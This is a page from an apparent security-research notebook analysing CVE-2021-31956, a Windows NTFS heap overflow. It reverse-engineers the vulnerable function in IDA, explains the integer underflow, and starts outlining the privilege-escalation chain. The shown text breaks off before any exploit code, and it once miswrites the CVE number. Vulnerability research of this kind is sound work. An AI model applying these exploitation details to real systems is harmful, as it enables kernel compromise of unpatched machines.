<!DOCTYPE HTML>
<html lang="en" class="light" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>CVE-2021-31956 - The !CPUID Shuffle</title>


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->

    </head>
    <body class="sidebar-visible no-js">
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('light')
            html.classList.add(theme);
            var body = document.querySelector('body');
            body.classList.remove('no-js')
            body.classList.add('js');
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var body = document.querySelector('body');
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            body.classList.remove('sidebar-visible');
            body.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="../Overview.html"><strong aria-hidden="true">1.</strong> Overview</a></li><li class="chapter-item expanded affix "><li class="part-title">Geoff Chappell, Software Analyst</li><li class="chapter-item expanded "><a href="../geoffchappell/ie/toc.html"><strong aria-hidden="true">2.</strong> Internet Explorer</a></li><li class="chapter-item expanded "><a href="../geoffchappell/kernel/toc.html"><strong aria-hidden="true">3.</strong> Kernel</a></li><li class="chapter-item expanded "><a href="../geoffchappell/notes/toc.html"><strong aria-hidden="true">4.</strong> Notes</a></li><li class="chapter-item expanded "><a href="../geoffchappell/shell/toc.html"><strong aria-hidden="true">5.</strong> Shell</a></li><li class="chapter-item expanded "><a href="../geoffchappell/win32/toc.html"><strong aria-hidden="true">6.</strong> Win32</a></li><li class="chapter-item expanded "><a href="../geoffchappell/win32/toc.html"><strong aria-hidden="true">7.</strong> MSVC</a></li><li class="chapter-item expanded affix "><li class="part-title">CVE Analysis</li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.</strong> CVE-2018-0617</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">9.</strong> CVE-2019-0539</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">10.</strong> CVE-2019-0567</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> CVE-2019-0983</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">12.</strong> CVE-2019-0998</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">13.</strong> CVE-2020-0871</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">14.</strong> CVE-2021-1648</div></li><li class="chapter-item expanded "><a href="../cve/CVE-2021-31956.html" class="active"><strong aria-hidden="true">15.</strong> CVE-2021-31956</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> CVE-2021-31969</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> CVE-2022-22715</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> CVE-2023-21766</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> CVE-2023-28229</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> CVE-2023-35359</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> CVE-2023-36906</div></li><li class="chapter-item expanded affix "><li class="part-title">Tools</li><li class="chapter-item expanded "><a href="../tools/WinDbg.html"><strong aria-hidden="true">22.</strong> Microsoft WinDbg</a></li><li class="chapter-item expanded affix "><li class="part-title">Shellcode Theory</li><li class="chapter-item expanded "><div><strong aria-hidden="true">23.</strong> Return-Oriented Programming</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">24.</strong> Jump-Oriented Programming</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">25.</strong> Call-Oriented Programming</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">26.</strong> Process Injection</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">27.</strong> Token Stealing</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">28.</strong> ACL Editing</div></li><li class="chapter-item expanded affix "><li class="part-title">Resources</li><li class="chapter-item expanded "><a href="../resources/Windows.html"><strong aria-hidden="true">29.</strong> Microsoft Windows</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">The !CPUID Shuffle</h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="table-of-contents"><a class="header" href="#table-of-contents">Table of Contents</a></h1>
<ul>
<li><a href="#table-of-contents">Table of Contents</a></li>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#reverse-engineering-cve-2021-31956">Reverse Engineering CVE-2021-31956</a>
<ul>
<li><a href="#the-initial-advisory">The Initial Advisory</a></li>
<li><a href="#recreating-cve-2021-31956">Recreating CVE-2021-31956</a>
<ul>
<li><a href="#locating-ntfsqueryeauserealist-in-ida">Locating NtfsQueryEaUserEaList in IDA</a></li>
<li><a href="#adding-a-custom-data-structure-in-ida">Adding a Custom Data Structure in IDA</a></li>
<li><a href="#renaming-variables-in-ida">Renaming Variables in IDA</a></li>
<li><a href="#analyzing-the-basic-blocks-and-pseudocode-in-ida">Analyzing the Basic Blocks and Pseudocode in IDA</a></li>
<li><a href="#examining-a-syscall-to-ntfsqueryeauserealist">Examining a Syscall to NtfsQueryEaUserEaList</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#exploiting-cve-2021-31956">Exploiting CVE-2021-31956</a>
<ul>
<li><a href="#returning-to-the-advisory">Returning to the Advisory</a>
<ul>
<li><a href="#exploit-chain">Exploit Chain</a></li>
<li><a href="#eprocess-structure">EPROCESS Structure</a></li>
<li><a href="#previousmode-overwrite">PreviousMode Overwrite</a></li>
</ul>
</li>
<li><a href="#exploitation-overview">Exploitation Overview</a></li>
<li><a href="#examining-y3as-proof-of-concept">Examining Y3A's Proof-of-Concept</a>
<ul>
<li><a href="#include-directives">Include Directives</a></li>
<li><a href="#null-pointer-declarations">NULL-Pointer Declarations</a></li>
<li><a href="#the-write64-function">The write64 Function</a></li>
<li><a href="#the-read64-function">The read64 Function</a></li>
<li><a href="#the-fix_runrefs-function">The fix_runrefs Function</a></li>
<li><a href="#the-steal_token-function">The steal_token Function</a></li>
<li><a href="#the-write_pool-function">The write_pool Function</a>
<ul>
<li><a href="#sandbox-constraints">Sandbox Constraints</a></li>
</ul>
</li>
<li><a href="#the-read_pool-function">The read_pool Function</a>
<ul>
<li><a href="#sandbox-constraints-1">Sandbox Constraints</a></li>
</ul>
</li>
<li><a href="#the-find_chunk-function">The find_chunk Function</a></li>
<li><a href="#the-overflow_chunk-function">The overflow_chunk Function</a></li>
<li><a href="#the-fragment_heap-function">The fragment_heap Function</a></li>
<li><a href="#the-spray_heap-function">The spray_heap Function</a>
<ul>
<li><a href="#security-descriptor-members">Security Descriptor Members</a>
<ul>
<li><a href="#revision">Revision</a></li>
<li><a href="#sbz1">Sbz1</a></li>
<li><a href="#control">Control</a></li>
<li><a href="#owner">Owner</a></li>
<li><a href="#group">Group</a></li>
<li><a href="#sacl">Sacl</a></li>
<li><a href="#dacl">Dacl</a></li>
</ul>
</li>
<li><a href="#sandbox-constraints-2">Sandbox Constraints</a></li>
</ul>
</li>
<li><a href="#the-get_eproc-function">The get_eproc Function</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
<h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
<p><a href="#table-of-contents">Return to Top</a></p>
<p>CVE-2021-31956 is a Windows kernel local privilege escalation vulnerability found in multiple Windows versions including but not limited to <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31956">Windows 10 20H2</a>. The computer security company Kaspersky first detected the vulnerability as a actively-exploited issue found <a href="https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/">in-the-wild</a>.</p>
<h1 id="reverse-engineering-cve-2021-31956"><a class="header" href="#reverse-engineering-cve-2021-31956">Reverse Engineering CVE-2021-31956</a></h1>
<p><a href="#table-of-contents">Return to Top</a></p>
<p>To start things off with, we will examine the advisory posted by Kaspersky and then use the information provided to find the vulnerability ourselves.</p>
<h2 id="the-initial-advisory"><a class="header" href="#the-initial-advisory">The Initial Advisory</a></h2>
<p><a href="#table-of-contents">Return to Top</a></p>
<p>The relevant portions of the vulnerability <a href="https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/">advisory</a> posted by Kaspersky is as follows:</p>
<blockquote>
<p>The other vulnerability, CVE-2021-31956, is a heap-based buffer overflow in <code>ntfs.sys</code>. The function <code>NtfsQueryEaUserEaList</code> processes a list of extended attributes for the file and stores the retrieved values to a buffer. This function is accessible via a <code>ntoskrnl</code> system call and among other things it's possible to control the size of the output buffer. If the size of the extended attribute is not aligned, the function will calculate a padding and the next extended attribute will be stored at a 32-bit alignment. The code then checks if the output buffer is long enough to fit the extended attribute with padding, but it doesn't check for a possible integer underflow. As a result, a heap-based buffer overflow can occur.</p>
</blockquote>
<blockquote>
<p>The exploit uses CVE-2021-31956 alongside the Windows Notification Facility (WNF) to create arbitrary memory read and write primitives. We are planning to publish more information about this technique in the future.</p>
</blockquote>
<blockquote>
<p>As the exploit uses CVE-2021-31955 to get the kernel address of the EPROCESS structure, it is able to use the common post-exploitation technique to steal the SYSTEM token. However, the exploit uses a rarely used "PreviousMode" technique instead. We have seen this technique used by the CHAINSHOT framework and even made a presentation about it at CanSecWest/BlueHat in 2019. The exploit then uses this technique to inject a malware module into the system process and executes it.</p>
</blockquote>
<p>Alongside the advisory, Kaspersky also posted the following pseudocode highlighting the vulnerable code in the <code>NtfsQueryEaUserEaList</code> function:</p>
<pre><code class="language-cpp">for ( cur_ea_list_entry = ea_list; ; cur_ea_list_entry = next_ea_list_entry )
{
  ...
 
  out_buf_pos = (DWORD *)(out_buf + padding + occupied_length);
 
  if ( NtfsLocateEaByName(eas_blocks_for_file, eas_blocks_size, &amp;name, &amp;ea_block_pos) )
  {
	ea_block = eas_blocks_for_file + ea_block_pos;
	ea_block_size = ea_block-&gt;DataLength + ea_block-&gt;NameLength + 9;
	if ( ea_block_size &lt;= out_buf_length - padding ) // integer-underflow is possible
	{
  	memmove(out_buf_pos, (const void *)ea_block, ea_block_size); // heap buffer overflow
  	*out_buf_pos = 0;
	}
  }
  else
  {
	...
  }
 
  ...
 
  occupied_length += ea_block_size + padding;
  out_buf_length -= ea_block_size + padding;
  padding = ((ea_block_size + 3) &amp; 0xFFFFFFFC) - ea_block_size;
 
  ...
}
</code></pre>
<p>Based on the analysis performed by <a href="https://y3a.github.io/2022/09/03/cve-2021-31956/">Y3A</a>, we can summarize the advisory as follows:</p>
<blockquote>
<p>There is a heap-based buffer overflow from an integer-underflow in the <code>ntfs.sys</code> function <code>NtfsQueryEaUserEaList</code> which is accessible via a <code>ntoskrnl.exe</code> system call. After gaining a kernel-mode write primitive, the exploit uses CVE-2021-31956 with the Windows Notification Facility and an <code>PreviousMode</code> overwrite technique for the exploit's <code>EPROCESS</code> structure.</p>
</blockquote>
<p>We can now move onto finding the vulnerability ourselves.</p>
<h2 id="recreating-cve-2021-31956"><a class="header" href="#recreating-cve-2021-31956">Recreating CVE-2021-31956</a></h2>
<p><a href="#table-of-contents">Return to Top</a></p>
<p>This next section focuses on how to find the vulnerability using IDA and WinDbg. In particular, we will be discussing the steps needed to both recreate the work already done by the vulnerability advisory as well as other researchers.</p>
<h3 id="locating-ntfsqueryeauserealist-in-ida"><a class="header" href="#locating-ntfsqueryeauserealist-in-ida">Locating NtfsQueryEaUserEaList in IDA</a></h3>
<p>Our focus now is to locate the function <code>NtfsQueryEaUserEaList</code> in a vulnerable version of <code>ntfs.sys</code>. In our case, we will be using a version from Windows 10 20H2. Once we have a version of the vulnerable driver, we will open it in IDA and locate <code>NtfsQueryEaUserEaList</code> in IDA:</p>
<p><img src="img/2024-03-06-23-03-18.png" alt="" /></p>
<p>As well as examining the pseudocode as shown in the advisory, we will also be looking through each basic block as it corresponds to the pseudocode. When we first generate the pseudocode for <code>NtfsQueryEaUserEaList</code>, we notice that we are missing both the variable names and possibly a data structure:</p>
<pre><code class="language-cpp">for ( i = a6; ; i = (unsigned int *)((char *)i + *i) )
{
    //...
    v16 = (_DWORD *)(a4 + v9 + v26);
    if //...
    {
        //...
        if ( (unsigned __int8)NtfsLocateEaByName(a2, *(unsigned int *)(a3 + 4), &amp;DestinationString, &amp;v21) )
        {
            v20 = a2 + v21;
            v17 = *(unsigned __int16 *)(v20 + 6) + *(unsigned __int8 *)(v20 + 5) + 9;
            if ( v17 &lt;= a5 - v9 )
            {
            memmove(v16, (const void *)v20, v17);
            *v16 = 0;
            goto LABEL_8;
            }
        }
        else
        {
            //...
            if //...
            {
                //...
                if //...
                {
                    if //...
                    {
                        v23 = v16;
                        a5 -= v17 + v9;
                        v9 = ((v17 + 3) &amp; 0xFFFFFFFC) - v17;
                        goto LABEL_24;
                    }
                }
                //...
            }
        }
        //...
    }
    //...
}
</code></pre>
<p>It is interesting to note that the our disassembly that IDA produced is quite different from the advisory. This may be due to a different vulnerable version of <code>ntfs.sys</code>. However, we will not worry about it for now as it does not seem to impact the exploitability of this bug.</p>
<h3 id="adding-a-custom-data-structure-in-ida"><a class="header" href="#adding-a-custom-data-structure-in-ida">Adding a Custom Data Structure in IDA</a></h3>
<p>Now that we have located the vulnerable function ourselves, let's proceed to recreate the data structure shown in the advisory:</p>
<pre><code class="language-cpp">ea_block_size = ea_block-&gt;DataLength + ea_block-&gt;NameLength + 9;
</code></pre>
<p>Here, we see that this structure provides extended attributes with two separate types of lengths. Now, using the search query</p>
<blockquote>
<p>extended attribute length structure microsoft</p>
</blockquote>
<p>We get the following two results:</p>
<p><img src="img/2024-03-07-10-02-55.png" alt="" /></p>
<p>We examine both structures, and we discover the <code>FILE_FULL_EA_INFORMATION</code> structure is the only structure out of the two to have two separate lengths defined:</p>
<pre><code class="language-cpp">typedef struct _FILE_FULL_EA_INFORMATION {
  ULONG  NextEntryOffset;
  UCHAR  Flags;
  UCHAR  EaNameLength;
  USHORT EaValueLength;
  CHAR   EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;
</code></pre>
<p>Now that we have the associated structure for the vulnerable code in <code>NtfsQueryEaUserEaList</code>, we will now go to <em>View -&gt; Open subviews -&gt; Local types</em>:</p>
<p><img src="img/2024-03-07-10-11-54.png" alt="" /></p>
<p>Once there, we will then right click within the view and select <em>Insert</em>:</p>
<p><img src="img/2024-03-07-10-12-51.png" alt="" /></p>
<p>A dialog box will then appear, within the dialog box we paste the <code>FILE_FULL_EA_INFORMATION</code> structure:</p>
<p><img src="img/2024-03-07-10-13-26.png" alt="" /></p>
<p>We then click <em>Ok</em> and head back to the variable <code>v20</code>, right-click on it, and select <em>Convert to struct</em>...*:</p>
<p><img src="img/2024-03-07-10-14-53.png" alt="" /></p>
<p>We will then go to our entry for <code>FILE_FULL_EA_INFORMATION</code>, select it, and click <em>Ok</em>:</p>
<p><img src="img/2024-03-07-10-16-30.png" alt="" /></p>
<p>At this point, we see that our data structure updated within IDA:</p>
<p><img src="img/2024-03-07-10-17-06.png" alt="" /></p>
<h3 id="renaming-variables-in-ida"><a class="header" href="#renaming-variables-in-ida">Renaming Variables in IDA</a></h3>
<p>Now that we have added our custom data structure, we can proceed to rename our variables in IDA to that of the variables provided in the initial advisory:</p>
<pre><code class="language-cpp">for ( cur_ea_list_entry = ea_list;
          ;
          cur_ea_list_entry = (unsigned int *)((char *)cur_ea_list_entry + *cur_ea_list_entry) )
{
    //...
    if //...
    {
        //...
        out_buf_pos = (_DWORD *)(out_buf + padding + occupied_length);
        if ( (unsigned __int8)NtfsLocateEaByName(eas_blocks_for_file, *(unsigned int *)(a3 + 4), &amp;name, &amp;ea_block_pos) )
        {
          ea_block = (_FILE_FULL_EA_INFORMATION *)(eas_blocks_for_file + ea_block_pos);
          ea_block_size = ea_block-&gt;EaValueLength + ea_block-&gt;EaNameLength + 9;
          if ( ea_block_size &lt;= out_buf_length - padding )
          {
            memmove(out_buf_pos, ea_block, ea_block_size);
            *out_buf_pos = 0;
            goto LABEL_8;
          }
        }
        else
        {
            //...
            if //...
            {
                //...
                if //...
                {
                    if //...
                    {
                        v23 = out_buf_pos;
                        out_buf_length -= ea_block_size + padding;
                        padding = ((ea_block_size + 3) &amp; 0xFFFFFFFC) - ea_block_size;
                        //...
                    }
                }
                //...
            }
        }
        //...
    }
</code></pre>
<p>One thing to note is that we are missing the <code>eas_blocks_size</code> parameter as our version of <code>ntfs.sys</code> uses a data structure value instead of a direct parameter as in the advisory. In addition, the iteration of <code>occupied_length</code> is slightly different.Finally, the way the <code>for</code> loop iterates through each entry is counted differently. However, since these differences do not seem to impact the exploit, we will ignore them.</p>
<h3 id="analyzing-the-basic-blocks-and-pseudocode-in-ida"><a class="header" href="#analyzing-the-basic-blocks-and-pseudocode-in-ida">Analyzing the Basic Blocks and Pseudocode in IDA</a></h3>
<p>Now that we have all pertinent data structures and variables in the vulnerable function <code>NtfsQueryEaUserEaList</code>, let's proceed to include more of the pseudocode to then better learn why this vulnerability exists in the first place. We will take the pseudocode provided by the Alex Plaskett in their <a href="https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/">analysis of CVE-2021-31956</a> and recontextualize it to our version of <code>ntfs.sys</code>:</p>
<pre><code class="language-cpp">__int64 __fastcall NtfsQueryEaUserEaList(
        __int64 a1,
        __int64 eas_blocks_for_file,
        __int64 a3,
        __int64 out_buf,
        unsigned int out_buf_length,
        unsigned int *ea_list,
        char a7)
{
  //...
  unsigned int padding; // r15d
  //...
  padding = 0;
  occupied_length = 0;
  while ( 1 )
  {
    //...
    for ( cur_ea_list_entry = ea_list; ; cur_ea_list_entry = (unsigned int *)((char *)cur_ea_list_entry + *cur_ea_list_entry) )
    {
      if ( cur_ea_list_entry == v11 )
      {
        v15 = occupied_length;
        out_buf_pos = (_DWORD *)(out_buf + padding + occupied_length);
        if ( (unsigned __int8)NtfsLocateEaByName(eas_blocks_for_file, *(unsigned int *)(a3 + 4), &amp;name, &amp;ea_block_pos) )
        {
          ea_block = (_FILE_FULL_EA_INFORMATION *)(eas_blocks_for_file + ea_block_pos);
          ea_block_size = ea_block-&gt;EaValueLength + ea_block-&gt;EaNameLength + 9;
          if ( ea_block_size &lt;= out_buf_length - padding )
          {
            memmove(out_buf_pos, ea_block, ea_block_size);
            *out_buf_pos = 0;
            goto LABEL_8;
          }
        }
        else
        {
          ea_block_size = *((unsigned __int8 *)v11 + 4) + 9;
          if ( ea_block_size + padding &lt;= out_buf_length )
          {
            //...
            *((_BYTE *)out_buf_pos + *((unsigned __int8 *)v11 + 4) + 8) = 0;
            //...
            v18 = ea_block_size + padding + v15;
            occupied_length = v18;
            if ( !a7 )
            {
              if ( v23 )
                *v23 = (_DWORD)out_buf_pos - (_DWORD)v23;
              if ( *v11 )
              {
                v23 = out_buf_pos;
                out_buf_length -= ea_block_size + padding;
                padding = ((ea_block_size + 3) &amp; 0xFFFFFFFC) - ea_block_size;
                goto LABEL_24;
              }
            }
            //...
          }
        }
        //...
      }
      //...
    }
    //...
  }
  //...
}
</code></pre>
<p>Now that we have the recontextualized pseudocode of <code>NtfsQueryEaUserEaList</code>, let's walk through what a syscall to <code>NtfsQueryEaUserEaList</code> would look like alongside each basic block.</p>
<h3 id="examining-a-syscall-to-ntfsqueryeauserealist"><a class="header" href="#examining-a-syscall-to-ntfsqueryeauserealist">Examining a Syscall to NtfsQueryEaUserEaList</a></h3>
<p>For this section, we will be walking through the analysis done by the Alex Plaskett in their <a href="https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/">blog post</a> analyzing CVE-2021-31956. To start things off, let's examine both the <code>for</code> loop and the primary <code>if</code> condition vulnerable to CVE-2021-31965:</p>
<pre><code class="language-cpp">//...
for ( cur_ea_list_entry = ea_list; ; cur_ea_list_entry = (unsigned int *)((char *)cur_ea_list_entry + *cur_ea_list_entry) )
    {
      if ( cur_ea_list_entry == v11 )
      {
        //...
         if ( (unsigned __int8)NtfsLocateEaByName(eas_blocks_for_file, *(unsigned int *)(a3 + 4), &amp;name, &amp;ea_block_pos) )
        {
          ea_block = (_FILE_FULL_EA_INFORMATION *)(eas_blocks_for_file + ea_block_pos);
          ea_block_size = ea_block-&gt;EaValueLength + ea_block-&gt;EaNameLength + 9;
          if ( ea_block_size &lt;= out_buf_length - padding )
          {
            memmove(out_buf_pos, ea_block, ea_block_size);
            *out_buf_pos = 0;
            goto LABEL_8;
          }
      }
      //...
    }
    //...
}
</code></pre>
<p>Looking at the basic block representation, we see that the <code>for</code> loop starts here:</p>
<p><img src="img/2024-03-07-13-12-31.png" alt="" /></p>
<p>As we can see, each value in <code>cur_ea_list_entry</code> is checked against <code>v11</code> or in other words, the value in the register RBX is compared to the value in R12. If the value in RBX is not equal to the value in R12, the loop takes the green code path. According to the advisory, the vulnerable function path for CVE-2021-31956 occurs when this basic block fails the check and takes the red code path. So far we have covered the following loop and check from our pseudocode:</p>
<pre><code class="language-cpp">//...
for ( cur_ea_list_entry = ea_list; ; cur_ea_list_entry = (unsigned int *)((char *)cur_ea_list_entry + *cur_ea_list_entry) )
    {
      if ( cur_ea_list_entry == v11 )
      {
        // WE ARE HERE
    }
    //...
}
</code></pre>
<p>We proceed to examine the next basic block we reach after not jumping with the JNZ instruction:</p>
<p><img src="img/2024-03-07-13-18-44.png" alt="" /></p>
<p>Now, according to the advisory, we want to pass this check and jump with the JNZ instruction. We can assume that the <code>NtfsLocateEaByName</code> probably checks if an Extended Attribute is present, and if so return 0 and jump. We now have covered the next <code>if</code> condition and we reexamine our position within the pseudocode:</p>
<pre><code class="language-cpp">//...
for ( cur_ea_list_entry = ea_list; ; cur_ea_list_entry = (unsigned int *)((char *)cur_ea_list_entry + *cur_ea_list_entry) )
    {
      if ( cur_ea_list_entry == v11 )
      {
        v15 = occupied_length;
        out_buf_pos = (_DWORD *)(out_buf + padding + occupied_length);
        if ( (unsigned __int8)NtfsLocateEaByName(eas_blocks_for_file, *(unsigned int *)(a3 + 4), &amp;name, &amp;ea_block_pos) )
        {
          // WE ARE HERE
        }
        //...
    }
    //...
}
</code></pre>
<p>We've now reached the vulnerable code inside of <code>NtfsQueryEaUserEaList</code>:</p>
<p><img src="img/2024-03-07-13-51-00.png" alt="" /></p>
<p>Looking at the diagram above, we can see two specific things:</p>
<ol>
<li>According to the x64 fastcall calling convention, RDX is the second input parameter for a function call. In our case, we know that RDX is user-controlled as per the advisory from Kaspersky.Therefore, we move onto the second observation.</li>
<li>If our controlled value is less than <em>or equal to</em> the output buffer length minus the padding, we pass the <code>if</code> condition.</li>
</ol>
<p>Now since we control half of the vulnerable <code>if</code> comparison, we should look further into what the other half entails. We continue to follow the basic block code path until we reach the code that sets the size of the <code>padding</code>:</p>
<p><img src="img/2024-03-07-14-04-00.png" alt="" /></p>
<p>Here, based again off of the information provided in the <a href="https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/">advisory</a>, we see that the padding is calculated in such a way to store the next extended attribute with a 32-bit alignment.</p>
<p>This is where the vulnerability occurs. If an attacker is able to create a perfectly aligned output buffer, we would pass the check where the <code>ea_block_size</code> variable is less than <em>or equal to</em> the output buffer's length minus a padding of 0.</p>
<h1 id="exploiting-cve-2021-31956"><a class="header" href="#exploiting-cve-2021-31956">Exploiting CVE-2021-31956</a></h1>
<p><a href="#table-of-contents">Return to Top</a></p>
<p>Now that we have an understanding of the vulnerability. We can now proceed to examine both the exploit used and the context in which it was originally discovered.</p>
<h2 id="returning-to-the-advisory"><a class="header" href="#returning-to-the-advisory">Returning to the Advisory</a></h2>
<p><a href="#table-of-contents">Return to Top</a></p>
<p>Before striking out on our own, let's go ahead and review the information already provided by Kaspersky in their advisory for CVE-2021-31956.</p>
<h3 id="exploit-chain"><a class="header" href="#exploit-chain">Exploit Chain</a></h3>
<p>In Kaspersky's initial triage of the discovery, CVE-2021-31956 was part
of a larger chain of vulnerabilities used to escape the Google Chrome
browser and use CVE-2021-31956 to escalate privileges and gain remote
code execution as the Windows kernel.</p>
<p>As mentioned previously, the attackers used
<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-21224">CVE-2021-21224</a> as a means to escape the Chrome
sandbox and gain remote code execution. Then, the attackers seemingly
used another exploit, chiefly <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-31955">CVE-2021-31955</a> to
obtain the kernel address of the current process' <code>EPROCESS</code> value
to then overwrite the <code>PreviousMode</code> offset to then set the current process'
context to that of <code>SYSTEM</code>.</p>
<h3 id="eprocess-structure"><a class="header" href="#eprocess-structure">EPROCESS Structure</a></h3>
<p>What is the <code>EPROCESS</code> structure? According to <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess">Microsoft</a>:</p>
<blockquote>
